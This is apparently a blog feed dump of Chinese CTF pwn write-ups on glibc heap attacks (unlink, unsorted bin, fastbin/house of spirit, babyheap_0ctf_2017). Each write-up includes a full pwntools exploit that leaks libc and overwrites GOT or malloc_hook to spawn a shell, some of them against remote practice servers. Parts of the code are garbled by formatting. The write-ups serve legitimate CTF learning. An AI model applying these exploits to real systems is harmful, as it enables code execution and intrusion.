-0x10)//fakebk,其实这里是&amp;fakechunk-0x10</p><p>这里，我们在chunk2的content位置构造了一个fakechunk，fakechunk的下一个chunk，也就是chunk3，当我们free(3)的时候，会触发unlink，这个时候会进行检测，fakechunk的上一个chunk，我们叫他FD，同理，下一个chunk我们叫他BK，会检测FD-&gt;bk是否等于fakechunk的地址，也就是&amp;fakechunk,BK-&gt;fd是否等于fakechunk的地址，也就是&amp;fakechunk,然后这时候有意思的事情就发生了，由于我们通过溢出或者某些手法，将fakechunk的fd改成了&amp;fakechunk-0x18,fd指针相信大家都知道是什么，那么系统就会认为fakechunk的上一个chunk的地址，也就是FD，他并不是真正的FD，所以实际上，我们是创造了一个fakeFD在&amp;fakechunk-0x18的位置，他并没有实际的chunk的数据结构，仅仅是为了绕过而形成的，一个逻辑上的chunk，不知道这样说大家能不能明白，下面，我都会将这个假的FD称为fakeFD，一个chunk的bk指针，通过chunk的结构体我们可以知道，应该在&amp;chunk-0x18的位置，于是我们创造出的fakeFD的bk指针应该在&amp;fakeFD-0x18的位置，而&amp;fakeFD又等于&amp;fakechunk+0x18，所以fakeFD-&gt;bk=&amp;fakeFD-0x18=&amp;fakechunk+0x18-0x18=&amp;fakechunk</p><p>这时你会发现我们竟然绕过了检测，同理下一个检测BK-&gt;fd=p也是一样的道理，如果你看懂了上面这里应该也很好理解，我就不细说了。</p><p>需要注意的是，网上很多文章都是伪代码，比如fakechunk到底是fakechunk的地址还是内容也没有写清楚，总之我就是用取地址符&amp;来指代fakechunk的地址，大家能看懂就好</p><p>如果上面还是觉得抽象，难以理解，不妨代入一下，最上面代码中的p其实就是我们伪造的fakechunk，然后根据我说的自己再绕一绕，应该很快就理解了，最重要的就是要理解我们构造p也就是fakechunk的fd和bk其实是为了创造出两个“逻辑上”的新堆块fakeFD和fakeBK，他们没有具体的chunk的数据结构，仅仅是为了绕过检测而存在。</p><p>我也没有人教，这里是我自己理解出来认为正确的理解，如果错了希望大佬指正，虽然本博客暂时没开评论功能…</p><p>明天字节ctf比赛将近，我应该晚上会去加紧学习tache attack和off by one，希望比赛时候能做出来点题目吧，感觉要学的东西实在是太多了…</p><p>比完赛会把另外一道例题zctf2016_note2的wp给写了，暂时就放个exp吧</p><h1 id="4-zctf2016-note2"><a href="#4-zctf2016-note2" class="headerlink" title="4.zctf2016_note2"></a>4.zctf2016_note2</h1><h2 id="1-碎碎念"><a href="#1-碎碎念" class="headerlink" title="1.碎碎念"></a>1.碎碎念</h2><p>虽然猜到字节ctf会很难，但没想到这么难，这pwn都是些什么东西…jspwn安卓pwn，最简单的题目都是我不常遇到的c++，果然又是爆0自闭惹，回来把wp补上，虽然被打自闭了但这几天还是在持续学习，感觉自己会的也越来越多，就是欠的wp有点多，感觉有三四篇了。</p><h2 id="2-exp"><a href="#2-exp" class="headerlink" title="2.exp"></a>2.exp</h2><p>from pwn import *<br>p = remote(“node4.buuoj.cn”,26635)</p><h1 id="p-process-“-note2”"><a href="#p-process-“-note2”" class="headerlink" title="p = process(“./note2”)"></a>p = process(“./note2”)</h1><h1 id="libc-ELF-“-lib-x86-64-linux-gnu-libc-2-23-so”"><a href="#libc-ELF-“-lib-x86-64-linux-gnu-libc-2-23-so”" class="headerlink" title="libc = ELF(“/lib/x86_64-linux-gnu/libc-2.23.so”)"></a>libc = ELF(“/lib/x86_64-linux-gnu/libc-2.23.so”)</h1><p>libc = ELF(“./libc-2.23-buu.so”)<br>elf = ELF(“./note2”)<br>def add(size,content):<br>    p.recvuntil(b”option—-&gt;&gt;”)<br>    p.sendline(‘1’)<br>    p.recvuntil(b”Input the length of the note content:(less than 128)”)<br>    p.sendline(str(size))<br>    p.recvuntil(b”Input the note content:”)<br>    p.sendline(content)<br>def delete(index):<br>    p.recvuntil(b”option—-&gt;&gt;”)<br>    p.sendline(‘4’)<br>    p.recvuntil(b”Input the id of the note:”)<br>    p.sendline(str(index))<br>    p.recvuntil(b”delete note success!”)<br>def shownote(index):<br>    p.recvuntil(b’option—-&gt;&gt;’)<br>    p.sendline(‘2’)<br>    p.recvuntil(b’note:’)<br>    p.sendline(str(index))<br>def editnote(index, choice, s):<br>    p.recvuntil(b’option—-&gt;&gt;’)<br>    p.sendline(‘3’)<br>    p.recvuntil(b’note:’)<br>    p.sendline(str(index))<br>    p.recvuntil(b’2.append]’)<br>    p.sendline(str(choice))<br>    p.sendline(s)<br>p.recvuntil(‘Input your name:’)<br>p.sendline(‘aaaa’)<br>p.recvuntil(‘Input your address:’)<br>p.sendline(‘1111’)<br>ptr = 0x602120<br>fake_fd = ptr - 0x18<br>fake_bk = ptr -0x10<br>content = b’a’<em>8 + p64(0x61) + p64(fake_fd) + p64(fake_bk) + b’b’</em>64+p64(0x60)<br>add(128,content)<br>add(0,b’a’<em>8)<br>add(0x80,b’c’</em>16)<br>delete(1)<br>content = b’a’<em>16 + p64(0xa0) + p64(0x90)<br>add(0,content)<br>delete(2)<br>atoi_got = elf.got[‘atoi’]<br>content = b’a’</em>0x18 + p64(atoi_got)<br>editnote(0,1,content)<br>shownote(0)<br>p.recvuntil(“is “)<br>atoi_addr = u64(p.recv(6).ljust(8, b’\x00’))<br>libc_base = atoi_addr - libc.symbols[‘atoi’]<br>system_addr = libc_base + libc.symbols[‘system’]<br>content = p64(system_addr)<br>editnote(0,1,content)<br>p.recvuntil(“option—-&gt;&gt;”)<br>p.sendline(“/bin/sh”)</p><h1 id="gdb-attach-p-2"><a href="#gdb-attach-p-2" class="headerlink" title="gdb.attach(p)"></a>gdb.attach(p)</h1><p>p.interactive()</p><h3 id="3-逆向"><a href="#3-逆向" class="headerlink" title="3.逆向"></a>3.逆向</h3><p>本来都想偷懒了，但是一看程序竟然忘了漏洞点在哪了，自己还是太菜了。还是菜单题，main没啥好看的直接看功能</p><h3 id="1-add"><a href="#1-add" class="headerlink" title="1.add"></a>1.add</h3><p><img src="/2021/10/15/unlink/11.png" alt="11"></p><p>这里咋一看没什么，以至于我刚看的时候忘记了漏洞点在哪，其实是在第15行他自己写的input_content函数</p><p>这里需要注意的是，我们chunk的地址是被存放在ptr这个数组里的，后面我们的unlink也是攻击这里</p><p>我们来看看这个input_content函数</p><p><img src="/2021/10/15/unlink/12.png" alt="12"></p><p>这里乍一看也没啥问题…但是i是一个unsigned的无符号整数，而有符号整数与无符号整数做比较时，会将自己变成无符号整数再比较，这也是我最近看csapp学来的知识，所以当我们将a2这个参数，在add函数中也就是size，设置成0的话，glibc为了满足一个chunk所需要的最起码的prev_size,size,fd,bk,按照规定会分配一个0x20的chunk，而0-1=-1，在unsigned整数里是最大整数，因此永远大于i，于是这里有一个任意写的漏洞。</p><h3 id="2-delte和show"><a href="#2-delte和show" class="headerlink" title="2.delte和show"></a>2.delte和show</h3><p>又短又干净，没啥分析的，不放了</p><h3 id="3-edit"><a href="#3-edit" class="headerlink" title="3.edit"></a>3.edit</h3><p>unsigned <strong>int64 edit()<br>{<br>  _BYTE <em>v0; // rbx<br>  int v2; // [rsp+8h] [rbp-E8h]<br>  int v3; // [rsp+Ch] [rbp-E4h]<br>  char </em>src; // [rsp+10h] [rbp-E0h]  </strong>int64 v5; // [rsp+18h] [rbp-D8h]<br>  char dest[128]; // [rsp+20h] [rbp-D0h] BYREF<br>  void *v7; // [rsp+A0h] [rbp-50h]<br>  unsigned __int64 v8; // [rsp+D8h] [rbp-18h]</p><p>  v8 = <strong>readfsqword(0x28u);<br>  if ( index_dword_602160 )<br>  {<br>    puts(“Input the id of the note:”);<br>    v2 = input_num();<br>    if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 3 )<br>    {<br>      src = (char <em>)</em>(&amp;ptr + v2);<br>      v5 = qword_602140[v2];<br>      if ( src )<br>      {<br>        puts(“do you want to overwrite or append?[1.overwrite/2.append]”);<br>        v3 = input_num();<br>        if ( v3 == 1 || v3 == 2 )<br>        {<br>          if ( v3 == 1 )<br>            dest[0] = 0;<br>          else<br>            strcpy(dest, src);<br>          v7 = malloc(0xA0uLL);<br>          strcpy((char <em>)v7, “TheNewContents:”);<br>          printf((const char </em>)v7);<br>          input_content((</strong>int64)v7 + 15, 144LL, 10);<br>          sub_400B10((const char <em>)v7 + 15);<br>          v0 = v7;<br>          v0[v5 - strlen(dest) + 14] = 0;<br>          strncat(dest, (const char </em>)v7 + 15, 0xFFFFFFFFFFFFFFFFLL);<br>          strcpy(src, dest);<br>          free(v7);<br>          puts(“Edit note success!”);<br>        }<br>        else<br>        {<br>          puts(“Error choice!”);<br>        }<br>      }<br>      else<br>      {<br>        puts(“note has been deleted”);<br>      }<br>    }<br>  }<br>  else<br>  {<br>    puts(“Please add a note!”);<br>  }<br>  return __readfsqword(0x28u) ^ v8;</p><p>｝</p><p>这里也是够长的，就是普通的edit，选择是覆盖内容，还是在原有内容上加长，有一个小漏洞就是如果加长的话，free(v7)以后相关指针并没有清0，但这里并没有用到，并且他的大小超过fastbin了，所以个人感觉也没啥暖用…</p><h2 id="4-攻击"><a href="#4-攻击" class="headerlink" title="4.攻击"></a>4.攻击</h2><p>还是和上一题差不多，用unlink去打got表</p><h3 id="1-把函数功能写写"><a href="#1-把函数功能写写" class="headerlink" title="1.把函数功能写写"></a>1.把函数功能写写</h3><p>rom pwn import *<br>p = remote(“node4.buuoj.cn”,26635)</p><h1 id="p-process-“-note2”-1"><a href="#p-process-“-note2”-1" class="headerlink" title="p = process(“./note2”)"></a>p = process(“./note2”)</h1><h1 id="libc-ELF-“-lib-x86-64-linux-gnu-libc-2-23-so”-1"><a href="#libc-ELF-“-lib-x86-64-linux-gnu-libc-2-23-so”-1" class="headerlink" title="libc = ELF(“/lib/x86_64-linux-gnu/libc-2.23.so”)"></a>libc = ELF(“/lib/x86_64-linux-gnu/libc-2.23.so”)</h1><p>libc = ELF(“./libc-2.23-buu.so”)<br>elf = ELF(“./note2”)<br>def add(size,content):<br>    p.recvuntil(b”option—-&gt;&gt;”)<br>    p.sendline(‘1’)<br>    p.recvuntil(b”Input the length of the note content:(less than 128)”)<br>    p.sendline(str(size))<br>    p.recvuntil(b”Input the note content:”)<br>    p.sendline(content)<br>def delete(index):<br>    p.recvuntil(b”option—-&gt;&gt;”)<br>    p.sendline(‘4’)<br>    p.recvuntil(b”Input the id of the note:”)<br>    p.sendline(str(index))<br>    p.recvuntil(b”delete note success!”)<br>def shownote(index):<br>    p.recvuntil(b’option—-&gt;&gt;’)<br>    p.sendline(‘2’)<br>    p.recvuntil(b’note:’)<br>    p.sendline(str(index))<br>def editnote(index, choice, s):<br>    p.recvuntil(b’option—-&gt;&gt;’)<br>    p.sendline(‘3’)<br>    p.recvuntil(b’note:’)<br>    p.sendline(str(index))<br>    p.recvuntil(b’2.append]’)<br>    p.sendline(str(choice))<br>    p.sendline(s)</p><p>没啥好说的</p><h3 id="2-似乎不该这么分，我也不知道这里写什么"><a href="#2-似乎不该这么分，我也不知道这里写什么" class="headerlink" title="2.似乎不该这么分，我也不知道这里写什么"></a>2.似乎不该这么分，我也不知道这里写什么</h3><p>ptr = 0x602120<br>fake_fd = ptr - 0x18<br>fake_bk = ptr -0x10<br>content = b’a’<em>8 + p64(0x61) + p64(fake_fd) + p64(fake_bk) + b’b’</em>64+p64(0x60)</p><p>add(128,content)//chunk0</p><p>add(0,b’a’<em>8)//chunk1<br>add(0x80,b’c’</em>16)//chunk2</p><p>delete(1)//先把chunk1 free<br>content = b’a’*16 + p64(0xa0) + p64(0x90)//覆盖chunk2的prev_size位和size位中的prev_inuse<br>add(0,content)//会把chunk1拿出来并写入造成溢出<br>delete(2)</p><p>这里还是在第一个chunk的地方构造了用于绕过unlink检测的fakechunk，p64(0x60)是为了绕过检测。</p><p>然后注意这里先把chunk1 free了，先把chunk2创建好再次add(0,content)，不然无法造成溢出。</p><p>然后delete（2）触发unlink，这里是覆盖了prev_size位这样系统就会认为他的上一个chunk有0xa0那么长，0xa0是我们设计的长度，自己算一算就知道，于是就会和我们构造的fakechunk处合并并触发unlink</p><p><em>16 + p64(0xa0) + p64(0x90)<br>add(0,content)<br>delete(2)<br>atoi_got = elf.got[‘atoi’]<br>content = b’a’</em>0x18 + p64(atoi_got)<br>editnote(0,1,content)</p><p><img src="/2021/10/15/unlink/13.png" alt="13"></p><p>这里不知道发生了什么就gdb.attach(p)进去看一下，多动手看看，堆就没有那么难，我们只是把chunk0的地址变成了got表的地址。</p><p>然后我们打印chunk0就把got表地址打印出来了，然后就是算偏移泄libc覆写，没啥好说的了</p><p>shownote(0)<br>p.recvuntil(“is “)<br>atoi_addr = u64(p.recv(6).ljust(8, b’\x00’))<br>libc_base = atoi_addr - libc.symbols[‘atoi’]<br>system_addr = libc_base + libc.symbols[‘system’]<br>content = p64(system_addr)<br>editnote(0,1,content)<br>p.recvuntil(“option—-&gt;&gt;”)<br>p.sendline(“/bin/sh”)</p><h1 id="gdb-attach-p-3"><a href="#gdb-attach-p-3" class="headerlink" title="gdb.attach(p)"></a>gdb.attach(p)</h1><p>p.interactive()</p><h3 id><a href="#" class="headerlink" title=" "></a> </h3>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-前言以及一点点感慨&quot;&gt;&lt;a href=&quot;#1-前言以及一点点感慨&quot; class=&quot;headerlink&quot; title=&quot;1.前言以及一点点感慨&quot;&gt;&lt;/a&gt;1.前言以及一点点感慨&lt;/h1&gt;&lt;p&gt;最近学完了unlink，做一下记录吧，还是挺感慨的，最近堆题有时候真是一题调晚上，甚至是一天，但是慢慢找到堆题的技巧了，感觉自己至少知道该如何调试一个程序了，自己最大的进步就是以前看着wp无法getshell的时候会不知道怎么办，现在知道该如何一点点去调试，看看底层哪里出了问题，然后找到问题的所在，所以慢慢的自己可以学会一个一个手法，有一种自己真正入门了的感觉。虽然学的很慢，但是相信总有一天我会把所有东西学会的。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>unsortedbin attack</title>
    <link href="http://example.com/2021/10/09/unsortedbin-attack/"/>
    <id>http://example.com/2021/10/09/unsortedbin-attack/</id>
    <published>2021-10-09T14:43:59.000Z</published>
    <updated>2021-10-22T09:50:52.088Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>依旧是ctfwiki pwn系列，上次的fastbin attck的第二题先摆了，逆向水平不够，但是主要的手法和思想已经学到了，今天学了unsorted bin attack</p><span id="more"></span><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>chunk进入unsortedbin的几种情况：</p><p>1.最主要的来源，就是当用户free一个不属于fastbin的chunk时，会优先进入unsorted bin</p><p>2.当一个较大的chunk被分成两半时，如果剩下的部分大于MINSIZE，就会被放到unsorted bin</p><p>3.当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</p><h2 id="unsorted-bin-leak"><a href="#unsorted-bin-leak" class="headerlink" title="unsorted bin leak"></a>unsorted bin leak</h2><p><img src="/2021/10/09/unsortedbin-attack/1.png" alt="1"></p><p>unsorted bin是一个双链表结构，其中会有一个chunk的fd指向main_arena，如果能泄露出他的fd指针，我们就可以知道main_arena，而malloc_hook，libc_base等都与main_arena固定偏移。</p><h3 id="实现leak的方法"><a href="#实现leak的方法" class="headerlink" title="实现leak的方法"></a>实现leak的方法</h3><p>大多数是通过uaf，double free等将已经放入unsorted bin中的chunk通过程序本身自带的“show”功能，打印出fd</p><h1 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h1><p><img src="/2021/10/09/unsortedbin-attack/2.png" alt="2"></p><p>第一眼竟然没看明白，其实就是把unsorted bin拿出来的时候，会把这个unsorted bin写进fd这个指针所指向的位置</p><p>所以unsortedbin的意义简单来讲，就是把一个很大的值写到一个指定地址</p><p>然后例题的话我也懒得细讲了，这题懂了原理的话看ctfwiki就很好理解了吧，直接放下wp</p><p>用我们今天学的unsorted bin attack改一下在bss段magic的值让他变得很大就可以调用后门函数getshell了</p><p>from pwn import *<br>p = process(“./magicheap”)<br>elf = ELF(“./magicheap”)<br>def creat(size,content):<br>    p.recvuntil(“:”)<br>    p.sendline(“1”)<br>    p.recvuntil(“Size of Heap : “)<br>    p.sendline(str(size))<br>    p.recvuntil(“Content of heap:”)<br>    p.sendline(content)<br>def delete(index):<br>    p.recvuntil(“:”)<br>    p.sendline(“3”)<br>    p.recvuntil(“Index :”)<br>    p.sendline(str(index))<br>def edit_heap(index,size,content):<br>    p.recvuntil(“:”)<br>    p.sendline(“2”)<br>    p.recvuntil(“Index :”)<br>    p.sendline(str(index))<br>    p.recvuntil(“Size of Heap : “)<br>    p.sendline(str(size))<br>    p.recvuntil(“Content of heap : “)<br>    p.sendline(content)</p><p>creat(0x20,b’aaaa’)<br>creat(0x80,b’bbbb’)<br>creat(0x20,b’cccc’)</p><h1 id="gdb-attach-p"><a href="#gdb-attach-p" class="headerlink" title="gdb.attach(p)"></a>gdb.attach(p)</h1><p>delete(1)<br>magic = 0x6020C0<br>fd = 0<br>bk = magic - 0x10<br>edit_heap(0,0x40,b’a’*0x20+p64(0)+p64(0x91)+p64(fd)+p64(bk))<br>creat(0x80,b’aaaa’)<br>p.recvuntil(‘:’)<br>p.sendline(‘4869’)<br>p.interactive()</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;依旧是ctfwiki pwn系列，上次的fastbin attck的第二题先摆了，逆向水平不够，但是主要的手法和思想已经学到了，今天学了unsorted bin attack&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>fastbin attack</title>
    <link href="http://example.com/2021/10/03/fastbin-attack/"/>
    <id>http://example.com/2021/10/03/fastbin-attack/</id>
    <published>2021-10-03T14:35:36.000Z</published>
    <updated>2021-10-22T09:50:52.081Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本来是想把ctfwiki里fastbin attack的内容全部写完再写的，结果做到下一题摆了，一直逆向逆不明白，就先把这篇写了吧</p><span id="more"></span><h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p><img src="/2021/10/03/fastbin-attack/1.png" alt="1"></p><p>老样子，先执行文件看一下大概功能，大概是这6个，然后扔进32位的ida</p><p>找到main函数，发现他就是执行了这个函数将他命名位menu菜单函数，这题也是典型的菜单题。</p><p>功能大概添加武器，展示武器，订购武器，为你的订购留下信息，最后就是展示大概情况吧。</p><p><img src="/2021/10/03/fastbin-attack/2.png" alt="2"></p><p>我们将每个函数功能改成合适的名字，在ida里面拖黄按n就可以改，我们先看add函数</p><p><img src="/2021/10/03/fastbin-attack/3.png" alt="3"></p><p>我们一行行看，如果有一些数据命名不一样就是我用上面的方法自己改的，为了美观。</p><p>首先 v1会记录上一个chunk的地址，然后新malloc一个chunk并将chunk地址赋值给原先chunk_addr这个指针</p><p>然后，将上一个chunk的地址也就是v1，赋值到chunk_addr + 13*4个字节的位置，乘4时因为DWORD四个字节</p><p>set0的功能暂时我也没逆明白，对这题没有太大影响。</p><p>然后同理在chunk_addr+25个字节处写入56个字节的name，并且下一行在chunk_addr的起始位置写入56个字节的description，这里存在溢出。</p><p>最后给add_times+1表示完成了一次add，注意add_times的位置，在bss段的804A2A4，这里后面可以用到。至此一个武器的生产完成，一个武器的struct也如上面所述，写个伪代码大概就是</p><p>struct Rifle</p><p>{</p><p>​    char name[27]</p><p>​    char description[25]</p><p>​    char *last_chunk_addr</p><p>}</p><p>下面是show函数</p><p><img src="/2021/10/03/fastbin-attack/4.png" alt="4"></p><p>这个比较容易看，就是一个循环遍历通过单链表的指针把之前每个武器的name和decription打印出来</p><p>另外一个比较重要的order函数</p><p><img src="/2021/10/03/fastbin-attack/6.png" alt="6"></p><p>还是一行行看，v1记录chunk_addr，这里依然是借助了单链表的结构遍历并且free掉，dword_804A2A0记录add的次数</p><p>leave_message</p><p><img src="/2021/10/03/fastbin-attack/5.png" alt="5"></p><p>往0x804a2a8处写入128个字节的数据，这里也是后面可以用到。</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>house_of_spirit，我的理解是在一个无法控制的内存区域，伪造一个chunk，然后我们可以通过程序本身提供的功能对chunk的任意读写的功能，以此来getshell</p><p>这题的话，通过add里面的溢出，将last_chunk改为got表地址，并且通过show函数将got表地址打印出来，从而泄露libc地址，我们发现这题没有开启 RELRO ，意味我们可以修改 got 表地址，同时，我们发现我们可以通过leave向0x804a2a8实现任意写的能力，于是我们希望在这里构造一个fake_chunk，这里注意，0x804a2a8这里其实藏了一个指针，很多wp都没有说到，我们用add将指针改为strlen的got表地址，然后通过leave输入system的got表地址，就可以完成strlen@got表的覆写，从而getshell。</p><h1 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h1><p>先贴exp</p><p>from pwn import *<br>p = process(“./oreo”)<br>elf = ELF(“./oreo”)<br>libc =ELF(‘/lib32/libc.so.6’)</p><h1 id="libc-ELF-‘-lib-x86-64-linux-gnu-libc-so-6’"><a href="#libc-ELF-‘-lib-x86-64-linux-gnu-libc-so-6’" class="headerlink" title="libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’"></a>libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’</h1><p>def add(name,desc):<br>    p.sendline(‘1’)<br>    p.sendline(name)<br>    p.sendline(desc)<br>def show():<br>    p.sendline(‘2’)<br>def order():<br>    p.sendline(‘3’)<br>def leave(msg):<br>    p.sendline(‘4’)<br>    p.sendline(msg)<br>name = b’a’<em>27 +p32(elf.got[‘puts’])<br>desc = b’b’</em>25<br>add(name,desc)<br>show()<br>p.recvuntil(‘Description: ‘)</p><h1 id="p-recvuntil-‘Name-‘"><a href="#p-recvuntil-‘Name-‘" class="headerlink" title="p.recvuntil(‘Name: ‘)"></a>p.recvuntil(‘Name: ‘)</h1><p>p.recvuntil(‘Description: ‘)<br>puts_addr = u32(p.recv(4))<br>libc_base = puts_addr - libc.symbols[“puts”]<br>system_addr = libc_base + libc.symbols[“puts”]</p><h1 id="gdb-attach-p"><a href="#gdb-attach-p" class="headerlink" title="gdb.attach(p)"></a>gdb.attach(p)</h1><p>target = 0x0804A2A8<br>for i in range(0x3e):<br>    add(b’a’<em>27+p32(0),b’a’</em>25)<br>vulnname = b’a’<em>27 + p32(target)<br>add(vulnname,b’a’</em>25)<br>padding = 0x38-(0xc0-0xa8)-4<br>payload = b’a’<em>padding+b’\x00’</em>4+b’a’*4+p32(0x40)<br>leave(payload)<br>order()<br>strlen_got_addr = p32(elf.got[‘strlen’])<br>add(b’b’,strlen_got_addr)<br>leave(p32(system_addr) + b’;bin/sh’)</p><h1 id="gdb-attach-p-1"><a href="#gdb-attach-p-1" class="headerlink" title="gdb.attach(p)"></a>gdb.attach(p)</h1><p>p.interactive()</p><p>这里我本地是完成getshell的交互了，但是不知道为什么输入命令行就EOF了…应该是本地libc小版本有问题，先不管了吧，比赛时候会给libc的。</p><p>然后贴一下0x804a2a8的调试结果</p><p><img src="/2021/10/03/fastbin-attack/7.png" alt="7"></p><p><img src="/2021/10/03/fastbin-attack/8.png" alt="8"></p><p>一开始自己死活不明白为什么写进去的是strlen的got表地址，再写system的地址就可以完成覆写，这里发现原来leave是通过内存中的指针进行写入的，而add是直接写入内存，所以还是要多动手实践。</p><p>然后就是构造fake_chunk的细节：next_chunk的size位要不大不小，自己的size要满足fastbin</p><p>多的就不说了，本wp仅用于个人反思，因为我懒所以写的可能不是很详细，下面贴两个我觉得写的不错的师傅wp，大家可以去那里学习</p><p><a href="https://www.jianshu.com/p/caa34a3218b8">https://www.jianshu.com/p/caa34a3218b8</a></p><p><a href="https://www.cnblogs.com/luoleqi/p/12357237.html">https://www.cnblogs.com/luoleqi/p/12357237.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本来是想把ctfwiki里fastbin attack的内容全部写完再写的，结果做到下一题摆了，一直逆向逆不明白，就先把这篇写了吧&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>babyheap_0ctf_2017-wp</title>
    <link href="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/"/>
    <id>http://example.com/2021/09/21/babyheap-0ctf-2017-wp/</id>
    <published>2021-09-21T15:45:03.000Z</published>
    <updated>2021-10-22T09:50:52.080Z</updated>
    
    <content type="html"><![CDATA[<p> 前言：如果按照buu的pwn题排序，这题虽然是堆的入门题，但是难度较之前无脑ROP的一堆栈题难度上升还是挺大的，阅读本文需要一定的对于chunk的基础。因为我个人在做题的时候，刚开始碰到那些alloc来free掉的有些不懂为什么要这样，找的博客也很少有说大概思路的，所以我就想把细致的思路用文字描述一下，然后我有点懒，也懒得再动手调一遍了，更懒得放图，所以放两个参考博客，都是我认为写的比较详细的博客，思路其实是一样的，payload稍微有点偏差，大家可以去看看，说不定你们就不想看我的博客了（::&gt;_&lt;::），然后就是这样吧，还是想强调一下本文多文字思路，几乎无图。因为懒，所以想要真正看懂这题还是要去多看看我下面放的这两个参考博客吧。</p><p>也不要说我没用，我怎么说也帮你在一堆讲的不太行的wp里放出了两个还行的。</p><p>总的来说博客2更详细一点，稍微更推荐博客2一点，博客1在malloc_hook那边动手调了一下，各有所长吧，肯定比大部分要搜到的奇怪wp要好很多。</p><p>参考博客1：<a href="http://pearcechn.top/2021/02/02/[writeup]buuctf-pwnheap_1/">http://pearcechn.top/2021/02/02/%E3%80%90writeup%E3%80%91buuctf-pwnheap_1/</a></p><p>参考博客2：<a href="https://blog.csdn.net/xieyichensss/article/details/116071092">https://blog.csdn.net/xieyichensss/article/details/116071092</a></p><p><strong>特别提醒，源码里面的‘与“不知道为什么复制粘贴过来就变成奇怪的格式，所以除非你愿意一个个改’与”，不建议使用本文源码，上面博客的源码与本文思路相同，可以参考</strong></p><span id="more"></span><h1 id="1-源码（请注意看前言的特别提醒！！！！！！！）"><a href="#1-源码（请注意看前言的特别提醒！！！！！！！）" class="headerlink" title="1.源码（请注意看前言的特别提醒！！！！！！！）"></a>1.源码（请注意看前言的特别提醒！！！！！！！）</h1><p>from pwn import *</p><h1 id="context-log-level-“debug”"><a href="#context-log-level-“debug”" class="headerlink" title="context.log_level = “debug”"></a>context.log_level = “debug”</h1><p>p = remote(‘node4.buuoj.cn’,26841)</p><h1 id="p-process-‘-babyheap-0ctf-2017’"><a href="#p-process-‘-babyheap-0ctf-2017’" class="headerlink" title="p = process(‘./babyheap_0ctf_2017’)"></a>p = process(‘./babyheap_0ctf_2017’)</h1><p>elf = ELF(‘./babyheap_0ctf_2017’)<br>one_gadget = 0x4526a</p><h1 id="libc-ELF-‘-lib-x86-64-linux-gnu-libc-so-6’-checksec-False"><a href="#libc-ELF-‘-lib-x86-64-linux-gnu-libc-so-6’-checksec-False" class="headerlink" title="libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’, checksec=False)"></a>libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’, checksec=False)</h1><p>libc = ELF(‘./libc-2.23-buu.so’)<br>def alloc(size):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”1”)<br>    p.recvuntil(b”Size: “)<br>    p.sendline(str(size))<br>def fill(idx,content):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”2”)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>    p.recvuntil(b”Size: “)<br>    p.sendline(str(len(content)))<br>    p.recvuntil(b”Content: “)<br>    p.send(content)<br>def free(idx):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b’3’)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>def dump(idx):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”4”)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>    p.recvline()<br>    return p.recvline()</p><p>alloc(0x10)<br>alloc(0x10)<br>alloc(0x10)<br>alloc(0x10)<br>alloc(0x80)</p><p>free(1)<br>free(2)</p><h1 id="gdb-attach-p"><a href="#gdb-attach-p" class="headerlink" title="gdb.attach(p)"></a>gdb.attach(p)</h1><p>payload = p64(0)<em>3<br>payload += p64(0x21)<br>payload += p64(0)</em>3<br>payload += p64(0x21)<br>payload += p8(0x80)<br>fill(0,payload)</p><h1 id="gdb-attach-p-1"><a href="#gdb-attach-p-1" class="headerlink" title="gdb.attach(p)"></a>gdb.attach(p)</h1><p>payload = p64(0)<em>3<br>payload += p64(0x21)<br>fill(3,payload)<br>alloc(0x10)<br>alloc(0x10)<br>payload = p64(0)</em>3<br>payload += p64(0x91)<br>fill(3,payload)<br>alloc(0x80)<br>free(4)</p><p>libc_base = u64(dump(2)[:8].strip().ljust(8, b”\x00”))-0x3c4b78#0x3c4b20+0x58=0x3cb78<br>success(‘libc_base =’ +hex(libc_base))<br>alloc(0x60)<br>free(4)<br>payload = p64(libc_base+0x3c4aed)<br>fill(2,payload)<br>alloc(0x60)<br>alloc(0x60)#fakechunk<br>payload = p8(0)<em>3+p64(0)</em>2<br>payload += p64(libc_base+one_gadget)<br>fill(6,payload)</p><h1 id="gdb-attach-p-2"><a href="#gdb-attach-p-2" class="headerlink" title="gdb.attach(p)"></a>gdb.attach(p)</h1><p>alloc(0x255)</p><p>p.interactive()</p><h1 id="2-一点点基础知识"><a href="#2-一点点基础知识" class="headerlink" 